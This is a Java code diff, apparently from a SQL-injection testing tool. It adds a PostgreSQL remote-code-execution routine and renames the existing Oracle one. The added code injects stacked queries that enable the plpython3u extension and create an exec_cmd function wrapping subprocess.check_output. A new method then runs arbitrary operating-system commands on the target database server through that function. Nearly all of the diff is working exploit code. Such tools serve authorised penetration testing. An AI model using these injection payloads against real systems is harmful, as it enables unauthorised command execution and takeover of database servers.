@@ -53,7 +53,46 @@ public class UdfAccess {
         this.injectionModel = injectionModel;
     }
 
-    public void createExploitRce(ExploitMethod exploitMethod) throws JSqlException {
+    public void createExploitRcePostgres(ExploitMethod exploitMethod) throws JSqlException {
+        if (!Arrays.asList(ExploitMethod.AUTO, ExploitMethod.QUERY_BODY).contains(exploitMethod)) {
+            LOGGER.log(LogLevelUtil.CONSOLE_INFORM, "Exploit method not implemented, using query body instead");
+        }
+
+        this.injectionModel.injectWithoutIndex(";CREATE EXTENSION plpython3u;", "body#create-ext");
+        var languages = this.getResult(
+            "select array_to_string(array(select lanname FROM pg_language),'')",
+            "body#find-ext"
+        );
+        if (!languages.contains("plpython3u")) {
+            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "RCE failure: python extension not found");
+            return;
+        }
+
+        this.injectionModel.injectWithoutIndex(String.join(
+            "%0a",
+            "; CREATE OR REPLACE FUNCTION exec_cmd(cmd TEXT) RETURNS text AS%20$$",
+            "from subprocess import check_output as c",
+            "return c(cmd).decode()",
+            "$$%20LANGUAGE plpython3u;"
+        ), "body#create-func");
+        var functions = this.getResult(
+            "SELECT routine_name FROM information_schema.routines WHERE routine_type = 'FUNCTION' and routine_name = 'exec_cmd'",
+            "body#find-func"
+        );
+        if (!functions.contains("exec_cmd")) {
+            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "RCE failure: function not found");
+            return;
+        }
+
+        LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "RCE successful: python function found");
+
+        var request = new Request();
+        request.setMessage(Interaction.ADD_TAB_EXPLOIT_RCE_POSTGRES);
+        request.setParameters(null, null);
+        this.injectionModel.sendToViews(request);
+    }
+
+    public void createExploitRceOracle(ExploitMethod exploitMethod) throws JSqlException {
         if (!Arrays.asList(ExploitMethod.AUTO, ExploitMethod.QUERY_BODY).contains(exploitMethod)) {
             LOGGER.log(LogLevelUtil.CONSOLE_INFORM, "Exploit method not implemented, using query body instead");
         }
@@ -105,7 +144,7 @@ public class UdfAccess {
         LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "RCE successful: java function found");
 
         var request = new Request();
-        request.setMessage(Interaction.ADD_TAB_EXPLOIT_RCE);
+        request.setMessage(Interaction.ADD_TAB_EXPLOIT_RCE_ORACLE);
         request.setParameters(null, null);
         this.injectionModel.sendToViews(request);
     }
@@ -322,13 +361,34 @@ public class UdfAccess {
         return true;
     }
 
-    public String runCommandRce(String command, UUID uuidShell) {
+    public String runCommandRceOracle(String command, UUID uuidShell) {
         String result;
         try {
             result = this.getResult(
                 String.format(
                     "SELECT %s('%s')||'%s' FROM dual",
                     UdfAccess.RCE_JAVA_UTIL_FUNC,
+                    command.replace(StringUtils.SPACE, "%20"),  // prevent SQL cleaning on system cmd: 'ls-l' instead of 'ls -l'
+                    VendorYaml.TRAIL_SQL
+                ),
+                "rce#run-cmd"
+            );
+        } catch (JSqlException e) {
+            result = "Command failure: " + e.getMessage() +"\nTry '"+ command.trim() +" 2>&1' to get a system error message.\n";
+        }
+        var request = new Request();
+        request.setMessage(Interaction.GET_EXPLOIT_RCE_RESULT);
+        request.setParameters(uuidShell, result);
+        this.injectionModel.sendToViews(request);
+        return result;
+    }
+
+    public String runCommandRcePostgres(String command, UUID uuidShell) {
+        String result;
+        try {
+            result = this.getResult(
+                String.format(
+                    "SELECT exec_cmd('%s')||'%s'",
                     command.replace(StringUtils.SPACE, "%20"),  // prevent SQL cleaning on system cmd: 'ls-l' instead of 'ls -l'
                     VendorYaml.TRAIL_SQL
                 ),
